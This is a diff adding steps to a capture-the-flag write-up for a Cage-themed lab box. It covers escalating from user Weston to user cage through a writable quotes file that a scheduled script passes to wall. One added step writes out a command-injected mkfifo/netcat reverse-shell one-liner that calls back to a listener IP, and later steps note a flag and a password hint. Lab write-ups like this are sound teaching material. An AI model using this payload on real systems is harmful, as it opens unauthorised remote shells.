@@ -14,5 +14,17 @@ Fun, because Cage is fun :)
 ## Shell as Weston
 
 6. Once on the machine, `sudo -l` revealed the user could run `/usr/bin/bees`. This is a shell script that just runs the `wall` command. However, the wall command is not something I can delete or move, by the looks of it.
+
 7. Navigating to the website directory, I found an `/auditions` folder containing an MP3 that obviously contained a spectogram. However, when I ran it through Sonic Visualiser it just gave me the password to the vignere encoding from before :D
+
 8. The other user on the machine was `cage`, so I ran a `find / -user cage 2>/dev/null` and found a folder called `.dad_scripts` under `/opt`. While on the machine I had noticed periodic wall broadcasts, and in here I found a python script running wall against a randomly selected quote from `/opt/.dad_scripts/.files/.quotes`, as `cage`. And the .quotes file was writable :)
+
+9. I overwrote .quotes with the following and waited:
+
+    echo ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.226.229 4444 >/tmp/f" > .quotes
+
+## Reverse Shell as Cage
+
+10. Once the shell popped, I navigated to `/home/cage`. In there was a file, `Super_Duper_Checklist` which contained the **user flag**.
+
+11. There was also an `email_backup` directory. Under there were three rather humorous emails, where Cage's agent is revealed to be the root user. There was also a hint to the password, `haiinspsyanileph`
